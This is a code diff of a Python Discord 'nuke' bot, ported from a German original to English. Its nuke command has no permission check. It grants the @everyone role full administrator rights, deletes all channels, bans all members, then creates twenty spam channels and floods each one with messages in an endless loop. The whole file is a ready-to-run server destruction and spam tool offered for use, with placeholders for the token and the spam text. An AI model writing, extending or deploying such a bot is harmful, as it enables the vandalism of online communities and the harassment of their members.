@@ -1,86 +1,95 @@
 import discord
 from discord.ext import commands
+import random
 from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "IHR_TOKEN_HIER"
-
-SPAM_CHANNEL =  ["CHANNEL NAME"]
-SPAM_MESSAGE = ["MESSAGE"]
+token = "Your Token Here"
 
 
-client = commands.Bot(command_prefix="!" , intents=discord.Intents.all())
+SPAM_CHANNEL =  ["Spam channel name here"]
+SPAM_MESSAGE = [" Spam message here"]
 
+
+client = commands.Bot(command_prefix="!", intents=discord.Intents.all())
 
 @client.event
 async def on_ready():
-    print("Bereit!")
-    await client.change_presence(activity=discord.Game(name="BOTS STATUS"))
+    print(f"{client.user} is ready!")
+    await client.change_presence(activity=discord.Game(name="Hail Yuno"))
 
-
+# Command to stop the bot
 @client.command()
-@commands.has_permissions(administrator=True)
+@commands.is_owner()
 async def stop(ctx):
     await ctx.bot.logout()
-    print(Fore.GREEN + f"{client.user.name} wurde erfolgreich abgemeldet." + Fore.RESET)
+    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
 
-
+# Nuke command: delete channels, ban users, and create spam channels
 @client.command()
-@commands.has_permissions(administrator=True)
 async def nuke(ctx):
-    await ctx.message.delete()
+    await ctx.message.delete()  # Attempt to delete the invoking message
     guild = ctx.guild
-    for member in guild.members:
-        if member == ctx.author:
-            continue
-        try:
-            await member.ban()
-            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} wurde gebannt." + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{member.name}#{member.discriminator} konnte nicht gebannt werden." + Fore.RESET)
-    await asyncio.sleep(1)
+
+    # Give @everyone admin permissions
+    try:
+        role = discord.utils.get(guild.roles, name="@everyone")
+        await role.edit(permissions=Permissions.all())
+        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+    except discord.errors.Forbidden:
+        print(Fore.RED + "Bot lacks permission to edit @everyone role." + Fore.RESET)
+    except Exception as e:
+        print(Fore.RED + f"An error occurred while giving @everyone admin: {e}" + Fore.RESET)
+
+    # Delete all channels in the guild
     for channel in guild.channels:
         try:
             await channel.delete()
-            print(Fore.MAGENTA + f"{channel.name} wurde gelöscht." + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{channel.name} konnte nicht gelöscht werden." + Fore.RESET)
-    for role in guild.roles:
+            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+        except discord.errors.Forbidden:
+            print(Fore.RED + f"Missing permissions to delete {channel.name}." + Fore.RESET)
+        except Exception as e:
+            print(Fore.RED + f"An error occurred while deleting {channel.name}: {e}" + Fore.RESET)
+
+    # Ban all members
+    for member in guild.members:
         try:
-            await role.delete()
-            print(Fore.MAGENTA + f"{role.name} wurde gelöscht." + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{role.name} konnte nicht gelöscht werden." + Fore.RESET)
-    for emoji in list(ctx.guild.emojis):
-        try:
-            await emoji.delete()
-            print(Fore.MAGENTA + f"{emoji.name} wurde gelöscht." + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{emoji.name} konnte nicht gelöscht werden." + Fore.RESET)
-    banned_users = await guild.bans()
-    for ban_entry in banned_users:
-        user = ban_entry.user
-        try:
-            await user.unban("IHR_USERNAME_UND_TAG")
-            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} wurde erfolgreich entbannt." + Fore.RESET)
-        except:
-            print(Fore.GREEN + f"{user.name}#{user.discriminator} wurde nicht entbannt." + Fore.RESET)
-    await guild.create_text_channel("TEXT_OF_SPAMMED_CHANNELS")
-    for channel in guild.text_channels:
-        link = await channel.create_invite(max_age=0, max_uses=0)
-        print(f"Neue Einladung: {link}")
-    amount = 500
+            await member.ban()
+            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned." + Fore.RESET)
+        except discord.errors.Forbidden:
+            print(Fore.RED + f"Missing permission to ban {member.name}#{member.discriminator}." + Fore.RESET)
+        except Exception as e:
+            print(Fore.RED + f"An error occurred while banning {member.name}: {e}" + Fore.RESET)
+
+    # Create spam channels and start spamming messages
+    amount = 20  # Define the number of spam channels you want to create
     for i in range(amount):
-        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
-    print(f"{guild.name} wurde erfolgreich vernichtet.")
+        try:
+            spam_channel = await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+            print(Fore.MAGENTA + f"Created spam channel: {spam_channel.name}" + Fore.RESET)
+
+            # Start spamming in the new channel
+            asyncio.create_task(spam_in_channel(spam_channel))  # Asynchronously spam each channel
+        except discord.errors.Forbidden:
+            print(Fore.RED + "Bot lacks permission to create channels." + Fore.RESET)
+        except Exception as e:
+            print(Fore.RED + f"An error occurred while creating channels: {e}" + Fore.RESET)
+
+    print(f"Nuked {guild.name} successfully.")
     return
 
-
-@client.event
-async def on_guild_channel_create(channel):
+# Function to spam messages in a channel
+async def spam_in_channel(channel):
     while True:
-        await channel.send(random.choice(SPAM_MESSAGE))
-
+        try:
+            await channel.send(random.choice(SPAM_MESSAGE))
+            await asyncio.sleep(10)  # Add a delay to avoid rate limits
+        except discord.errors.Forbidden:
+            print(Fore.RED + f"Bot lacks permission to send messages in {channel.name}." + Fore.RESET)
+            break
+        except Exception as e:
+            print(Fore.RED + f"An error occurred while spamming in {channel.name}: {e}" + Fore.RESET)
+            break
 
 client.run(token)
